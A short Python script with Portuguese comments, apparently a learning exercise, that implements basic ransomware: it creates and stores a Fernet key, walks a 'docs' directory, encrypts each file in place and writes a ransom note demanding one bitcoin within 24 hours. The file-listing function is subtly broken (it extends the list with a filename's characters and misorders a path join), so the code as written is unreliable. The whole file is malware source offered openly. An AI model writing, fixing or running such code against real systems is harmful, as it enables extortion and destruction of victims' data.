from cryptography.fernet import Fernet
import os 


#Primeiro, está sendo feito a parte de geração da chave. Essa chave será alocada dentro de um arquivo
def create_key():
    key = Fernet.generate_key()
    with open("key_file.key", "wb") as file:
        file.write(key)

#Segundo, está sendo criado uma função responsável para ler esse arquivo. 
def load_key():
    return open("key_file.key", "rb").read()


#Terceiro, está sendo desenvolvida uma função responsável por criar a criptografia.
def encrypt_archive(archive, key):
    f = Fernet(key)
    with open (archive, "rb")as file:
        data = file.read()
    encrypted_data = f.encrypt(data)
    with open(archive, "wb")as file:
        file.write(encrypted_data)

#Quarto, configurando uma maneira para acessar estes arquivos.
def find_files(directory):
    list_ = []
    for root, _, archives in os.walk(directory):
        for name in archives:
            path_to = os.path.join(name, root)
            if name != "crypto.py" and not name.endswith(".key"):
                list_.extend(name)
    return list_

#Quinto, definindo uma mensagem de resgate para o alvo ler. 
def send_rescue_message():
    with open ("read_this.txt", "w") as file:
        file.write("YOUR DATA WAS BREACHED!")
        file.write("If you want it back, the price is 1 bitcoin \n")
        file.write("You have 24 hours to respond. We're waiting :D.")

def main():
    create_key()
    key = load_key()
    archives = find_files("docs")
    for archive in archives:
        encrypt_archive(archive, key)
    send_rescue_message()
    print("Executed Ransomware!")

if __name__ == "__main__":
    main()

